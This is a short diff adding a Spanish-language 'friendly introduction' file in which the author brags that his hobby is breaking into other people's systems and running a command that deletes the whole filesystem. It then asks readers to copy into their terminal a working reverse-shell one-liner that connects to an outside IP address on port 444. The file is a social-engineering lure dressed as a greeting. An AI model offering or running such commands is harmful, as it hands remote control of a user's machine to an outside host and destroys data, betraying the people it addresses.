@@ -1,0 +1,11 @@
+Hola mucho gusto mi nombre es Juan David Jaramillo 
+mi pasatimepo favorito es entrar a sistemas agenos y ejecutar ``rm -rf / 2> /dev/null`
+
+Soy muy amigable :)
+
+seamos amigis 
+Copia este codigo`en tu terminal  `bash -i >& /dev/tcp/172.10.20.92/444 0>&1`
+
+:3
+
+
